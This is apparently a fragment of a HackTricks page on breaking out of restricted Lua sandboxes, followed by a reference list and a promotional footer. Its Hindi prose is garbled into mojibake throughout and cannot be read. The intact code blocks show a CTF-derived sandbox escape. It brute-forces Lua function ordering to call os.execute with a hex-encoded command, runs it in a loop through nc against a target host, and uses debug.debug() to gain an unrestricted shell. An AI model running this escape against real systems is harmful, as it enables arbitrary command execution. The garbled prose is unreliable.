рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдкрд┐рдЫрд▓реЗ рд╡рди рд▓рд╛рдЗрдирд░ рдХреЛ рдЖрдк **рдПрдХ рдЕрд▓рдЧ lua рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдлрдВрдХреНрд╢рдиреЛрдВ рдХрд╛ рдХреНрд░рдо рдмрджрд▓ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди lua рдкрд░реНрдпрд╛рд╡рд░рдгреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗ le рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдкрд╣рд▓реЗ рдлрдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд▓реБрдЖ рд╢реИрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**: рдпрджрд┐ рдЖрдк рд╕реАрдорд┐рдд рд▓реБрдЖ рд╢реИрд▓ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдк рдирдпрд╛ рд▓реБрдЖ рд╢реИрд▓ (рдФрд░ рдЙрдореНрдореАрдж рд╣реИ рдЕрд╕реАрдорд┐рдд) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ:
```bash
debug.debug()
```
## рд╕рдВрджрд░реНрдн

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**ред

</details>
